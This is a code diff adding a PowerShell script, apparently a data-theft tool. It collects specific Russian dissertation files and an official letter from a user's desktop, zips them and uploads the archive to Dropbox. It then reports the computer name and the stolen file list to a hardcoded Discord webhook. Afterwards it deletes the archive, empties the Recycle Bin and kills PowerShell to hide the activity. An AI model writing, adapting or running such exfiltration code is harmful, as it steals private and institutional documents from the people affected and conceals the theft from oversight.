@@ -1,1 +1,98 @@
-1
+# Files to Extract
+$filesToZip = @(
+    "C:\Users\ADM\Desktop\Диссертации\Мачалов А.С. докторская\Автореферат д.м.н. Мачалов А.С. (в печать) (4).docx",
+    "C:\Users\ADM\Desktop\Диссертации\Мачалов А.С. докторская\Мачалов дисс д.м.н. (в печать).docx"
+	"C:\Users\ADM\Desktop\Диссертации\Кузнецов А.О\финал\Автореферат Кузнецов А.О..docx"
+	"C:\Users\ADM\Desktop\Диссертации\Кузнецов А.О\финал\Докторская диссертация Кузнецов А.О (1) (Автосохраненный).docx"
+	"C:\Users\ADM\Desktop\Защитники отечества\на 26.03.24\исх. от 25.03.2024 №328п.pdf"
+)
+
+# Form ZIP File
+$zipFilePath = "C:\Users\DAN\Desktop\Extraction.zip"  # Specify a full path to avoid ambiguity
+if (Test-Path $zipFilePath) { Remove-Item $zipFilePath -Force }  # Remove existing zip file if it exists
+
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+$zip = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+$successfulUploads = @()
+$failedUploads = @()
+foreach ($file in $filesToZip) {
+    if (Test-Path $file) {
+        $fileName = [System.IO.Path]::GetFileName($file)
+        try {
+            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $file, $fileName, 'Optimal')
+            $successfulUploads += $fileName
+        } catch {
+            $failedUploads += $fileName
+        }
+    }
+}
+$zip.Dispose()
+
+# Upload the zip file to Dropbox
+function DropBox-Upload {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
+        [Alias("f")]
+        [string]$SourceFilePath
+    ) 
+    $DropBoxAccessToken = "DROPBOXTOKEN"   # Replace with your DropBox Access Token
+    $outputFile = Split-Path $SourceFilePath -leaf
+    $TargetFilePath = "/$outputFile"
+    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+    $authorization = "Bearer " + $DropBoxAccessToken
+    $headers = @{
+        "Authorization" = $authorization
+        "Dropbox-API-Arg" = $arg
+        "Content-Type" = 'application/octet-stream'
+    }
+    try {
+        Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -InFile $SourceFilePath -Headers $headers
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+$uploadResult = DropBox-Upload -SourceFilePath $zipFilePath
+
+# Discord confirmation
+function Send-DiscordWebhookMessage {
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$WebhookURL,
+
+        [Parameter(Mandatory = $true)]
+        [string]$Message,
+
+        [string]$Username = $env:COMPUTERNAME,
+        
+        [int]$Color = 16777215
+    )
+
+    $payloadObject = @{
+        username = $Username
+        content = $Message
+        embeds = @(
+            @{
+                title = $Username
+                description = $Message
+                color = $Color
+            }
+        )
+    }
+
+    $payloadJson = $payloadObject | ConvertTo-Json
+
+    Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType "application/json" -Body $payloadJson
+}
+
+$webhookURL = "https://discordapp.com/api/webhooks/1208302508607279185/cIM-H8mB-Txf2yqUW12819rlKaYMQ6g3IuTJJ058vTDieVw6qlzCJHgKlT8xr6IEDB5j"
+$message = "Extraction Status:"
+$message += "`nSuccessful Uploads: $($successfulUploads -join ', ')"
+$message += "`nFailed Uploads: $($failedUploads -join ', ')"
+
+Send-DiscordWebhookMessage -WebhookURL $webhookURL -Message $message
+Remove-Item -Path $zipFilePath -Force
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+Stop-Process -Name powershell
